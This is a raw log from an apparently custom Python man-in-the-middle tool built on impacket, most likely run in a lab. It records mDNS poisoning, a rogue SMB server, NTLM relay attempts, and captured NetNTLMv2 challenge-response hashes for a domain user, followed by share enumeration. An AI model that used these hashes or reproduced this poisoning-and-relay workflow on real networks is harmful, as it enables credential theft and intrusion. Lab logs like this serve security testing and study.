2021-11-05 14:25:39.062 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:15.294 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:15.294 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:15.294 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:15.296 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:15.296 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:15.296 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:15.301 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:15.301 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:15.301 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:15.302 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:15.302 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:15.302 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:15.303 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:15.303 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:15.303 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:16.242 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:16.242 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:16.242 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:17.516 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:26:17.516 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:26:17.516 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:26:17.516 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:90 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-05 14:26:17.522 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:17.524 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:17.522 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:17.524 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:17.522 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:17.524 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:17.522 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:17.524 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:17.532 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:17.532 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:17.532 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:17.532 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:17.533 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:17.533 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:17.533 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:17.533 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:17.534 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:17.534 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:17.534 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:17.534 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:20.081 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:127 - The attack is already running in the background
2021-11-05 14:26:20.081 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:127 - The attack is already running in the background
2021-11-05 14:26:20.081 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:127 - The attack is already running in the background
2021-11-05 14:26:20.081 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:127 - The attack is already running in the background
2021-11-05 14:26:23.010 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:26:23.010 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:26:23.010 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:26:23.010 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-05 14:26:24.028 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:24.028 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:24.028 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:24.028 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:24.028 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-05 14:26:24.032 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:24.032 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:24.032 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:24.032 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:24.032 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-05 14:26:24.038 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:24.038 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:24.038 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:24.038 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:24.038 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-05 14:26:24.051 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:24.051 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:24.051 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:24.051 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:24.051 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-05 14:26:24.053 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:24.053 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:24.053 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:24.053 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:24.053 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-05 14:26:25.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:86 - Exiting smb relay attack ...
2021-11-09 18:19:49.716 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-09 18:19:49.717 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
2021-11-09 18:19:49.725 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-09 18:19:49.726 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-09 18:19:49.730 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-09 18:19:57.426 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-09 18:19:57.458 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-09 18:20:00.782 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-09 18:20:00.813 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-09 18:20:30.587 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-09 18:20:30.630 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-09 18:20:41.074 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-09 18:20:41.121 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-09 18:20:53.496 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
2021-11-09 18:20:54.827 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-09 18:20:54.827 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-09 18:20:54.828 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
2021-11-09 18:20:54.828 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
2021-11-09 18:20:54.831 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-09 18:20:54.831 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-09 18:20:54.832 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-09 18:20:54.832 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-09 18:20:54.838 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-09 18:20:54.838 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-09 18:20:59.363 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-09 18:20:59.363 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-09 18:20:59.404 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-09 18:20:59.404 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-09 18:21:00.374 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49770)
2021-11-09 18:21:00.374 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49770)
2021-11-09 18:21:00.411 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-09 18:21:00.411 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-09 18:21:00.413 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-09 18:21:00.413 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-09 18:21:00.415 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2c6c134782e199a0e3c5823b0e23bf31:0101000000000000008eeb8b96d5d70105454893b38631300000000001001000520065004800460055007200470059000300100052006500480046005500720047005900020010006a006d007a0047004700700062004d00040010006a006d007a0047004700700062004d0007000800008eeb8b96d5d701060004000200000008003000300000000000000000000000002000007338c7a82b2da8bddb01153f77e9aee549063128e66e70819ec174bc93e339530a001000000000000000000000000000000000000900240063006900660073002f0063006f00730069007400610073002e006c006f00630061006c000000000000000000
2021-11-09 18:21:00.415 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2c6c134782e199a0e3c5823b0e23bf31:0101000000000000008eeb8b96d5d70105454893b38631300000000001001000520065004800460055007200470059000300100052006500480046005500720047005900020010006a006d007a0047004700700062004d00040010006a006d007a0047004700700062004d0007000800008eeb8b96d5d701060004000200000008003000300000000000000000000000002000007338c7a82b2da8bddb01153f77e9aee549063128e66e70819ec174bc93e339530a001000000000000000000000000000000000000900240063006900660073002f0063006f00730069007400610073002e006c006f00630061006c000000000000000000
2021-11-09 18:21:00.454 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-09 18:21:00.454 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-09 18:21:00.478 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-09 18:21:00.478 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-09 18:21:00.564 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-09 18:21:00.564 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-09 18:21:06.872 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
2021-11-09 18:21:06.872 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
2021-11-10 17:11:32.233 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 17:11:32.236 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
2021-11-10 17:11:33.796 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-10 17:11:33.800 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-10 17:11:33.803 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-10 17:12:37.054 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-10 17:12:37.091 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-10 17:15:45.924 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-10 17:15:45.962 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-10 17:16:00.769 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-10 17:16:00.802 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-10 17:23:42.425 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-10 17:23:42.462 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-10 17:23:43.914 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49895)
2021-11-10 17:23:50.525 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-10 17:23:50.526 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-10 17:23:50.528 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:2d85677560359cfebbf7a790916e5463:010100000000000080131bb857d6d7013ec210c17b56201000000000010010004a00430049006c005100660058005800030010004a00430049006c005100660058005800020010007a004300660044005a006a006e007300040010007a004300660044005a006a006e0073000700080080131bb857d6d701060004000200000008003000300000000000000000000000002000009647d241f94f9ae176abb0712ac5510ce367cc4987e9ae58386e7341ccb816390a001000000000000000000000000000000000000900260063006900660073002f00640061006c0065006d0069006e0069002e006c006f00630061006c000000000000000000
2021-11-10 17:23:51.301 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-10 17:23:51.323 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-10 17:23:52.428 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-10 17:23:58.321 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
2021-11-10 17:26:18.496 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 17:26:18.500 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
2021-11-10 17:26:18.604 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-10 17:26:18.607 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-10 17:26:18.623 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-10 17:26:26.742 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-10 17:26:26.783 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-10 17:26:27.738 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49903)
2021-11-10 17:26:27.766 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-10 17:26:27.767 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-10 17:26:27.767 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4915e492b1e430fe1dbd5513fa759625:01010000000000008023791758d6d701422c9b514304d6be000000000100100077006f0076007a007200690070004b000300100077006f0076007a007200690070004b000200100041004a007800750070005400660049000400100041004a00780075007000540066004900070008008023791758d6d701060004000200000008003000300000000000000000000000002000009647d241f94f9ae176abb0712ac5510ce367cc4987e9ae58386e7341ccb816390a001000000000000000000000000000000000000900240063006900660073002f0070007200750065006200610073002e006c006f00630061006c000000000000000000
2021-11-10 17:26:27.786 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-10 17:26:27.802 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-10 17:26:28.381 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-10 17:26:29.257 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:103 - Exiting smb relay attack ...
2021-11-10 17:28:13.851 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 17:28:13.855 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:54 - Starting Malicious SMB Server ...
2021-11-10 17:28:13.885 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-10 17:28:13.891 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-10 17:28:13.892 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-10 17:28:19.864 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-10 17:28:19.917 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-10 17:28:20.819 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49906)
2021-11-10 17:28:20.942 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-10 17:28:20.944 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-10 17:28:20.946 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:9dcc2f95fa66e18b6df96131495402a6:01010000000000000092d35a58d6d70111792cac6300b46a00000000010010004b006400560044004300670059005000030010004b00640056004400430067005900500002001000510058007600560044007700620064000400100051005800760056004400770062006400070008000092d35a58d6d701060004000200000008003000300000000000000000000000002000009647d241f94f9ae176abb0712ac5510ce367cc4987e9ae58386e7341ccb816390a001000000000000000000000000000000000000900240063006900660073002f0070007200750065006200610073002e006c006f00630061006c000000000000000000
2021-11-10 17:28:21.036 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-10 17:28:24.169 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:103 - Exiting smb relay attack ...
2021-11-10 18:01:15.424 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 18:01:15.427 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:64 - Starting Malicious SMB Server ...
2021-11-10 18:01:15.440 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-10 18:01:15.454 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-10 18:01:15.455 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-10 18:01:16.697 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:104 - Exiting smb relay attack ...
2021-11-10 18:01:18.076 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:108 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-10 18:01:18.076 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:108 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-10 18:01:18.094 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 18:01:18.095 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:64 - Starting Malicious SMB Server ...
2021-11-10 18:01:18.094 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 18:01:18.095 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:64 - Starting Malicious SMB Server ...
2021-11-10 18:03:14.734 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:108 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-10 18:03:14.745 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 18:03:14.745 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:64 - Starting Malicious SMB Server ...
2021-11-10 18:03:14.751 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-10 18:03:14.756 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-10 18:03:14.756 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-10 18:04:03.337 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:108 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-10 18:04:03.343 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-10 18:04:03.344 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:64 - Starting Malicious SMB Server ...
2021-11-10 18:04:03.348 | INFO     | impacket.smbserver:log:4132 - Config file parsed
